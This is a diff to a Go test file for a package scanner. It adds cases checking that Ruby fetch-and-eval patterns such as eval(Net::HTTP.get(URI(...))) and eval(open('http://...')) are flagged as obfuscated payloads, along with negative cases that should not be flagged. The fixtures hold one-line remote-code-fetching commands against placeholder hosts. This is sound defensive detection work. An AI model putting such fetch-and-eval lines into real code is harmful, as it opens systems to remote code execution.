@@ -216,6 +216,81 @@ func TestDetectSourcePatterns_URLScanIsLanguageAgnostic(t *testing.T) {
 	}
 }
 
+// Plan B — Ruby `eval(Net::HTTP.get(...))` and friends. Mirrors the
+// JS obfuscation suite in shape; only positive cases are exhaustive
+// (negatives covered above and in TestDetectSourcePatterns_OnlyJSFiles).
+func TestDetectSourcePatterns_RubyObfuscation(t *testing.T) {
+	tests := []struct {
+		name     string
+		filename string
+		body     string
+		wantHas  domain.Capability
+	}{
+		{
+			name:     "eval(Net::HTTP.get(URI(...)))",
+			filename: "lib/restclient.rb",
+			body:     `eval(Net::HTTP.get(URI('http://x.test/payload')))`,
+			wantHas:  domain.CapObfuscatedPayload,
+		},
+		{
+			name:     "eval(Net::HTTP.post(...))",
+			filename: "lib/foo.rb",
+			body:     `eval(Net::HTTP.post(URI('http://x.test'), body))`,
+			wantHas:  domain.CapObfuscatedPayload,
+		},
+		{
+			name:     "eval(open('http://...'))",
+			filename: "lib/foo.rb",
+			body:     `eval(open('http://example.test/payload'))`,
+			wantHas:  domain.CapObfuscatedPayload,
+		},
+		{
+			name:     "eval(URI.open(...))",
+			filename: "lib/foo.rb",
+			body:     `eval(URI.open(remote))`,
+			wantHas:  domain.CapObfuscatedPayload,
+		},
+		{
+			name:     "Net::HTTP.get without eval — not flagged",
+			filename: "lib/foo.rb",
+			body:     `body = Net::HTTP.get(URI('http://api.example.test/v1'))`,
+			wantHas:  0,
+		},
+		{
+			name:     "eval on local string — not flagged",
+			filename: "lib/foo.rb",
+			body:     `eval("puts 'hi'")`,
+			wantHas:  0,
+		},
+		{
+			name:     ".gemspec extension also scanned",
+			filename: "foo.gemspec",
+			body:     `eval(Net::HTTP.get(URI('http://x.test')))`,
+			wantHas:  domain.CapObfuscatedPayload,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			caps := DetectSourcePatterns(usecase.PackageSource{
+				Files: map[string][]byte{tt.filename: []byte(tt.body)},
+			})
+			has := false
+			for _, c := range caps {
+				if c == tt.wantHas {
+					has = true
+				}
+			}
+			if tt.wantHas != 0 && !has {
+				t.Errorf("want %v, got %v", tt.wantHas, caps)
+			}
+			if tt.wantHas == 0 && len(caps) != 0 {
+				t.Errorf("want no caps, got %v", caps)
+			}
+		})
+	}
+}
+
 // Sanity: catches the pattern even in minified content (one long line).
 func TestDetectSourcePatterns_Minified(t *testing.T) {
 	js := strings.Repeat("var x=1;", 1000) + `eval(atob("YWJj"))` + strings.Repeat("var y=2;", 1000)
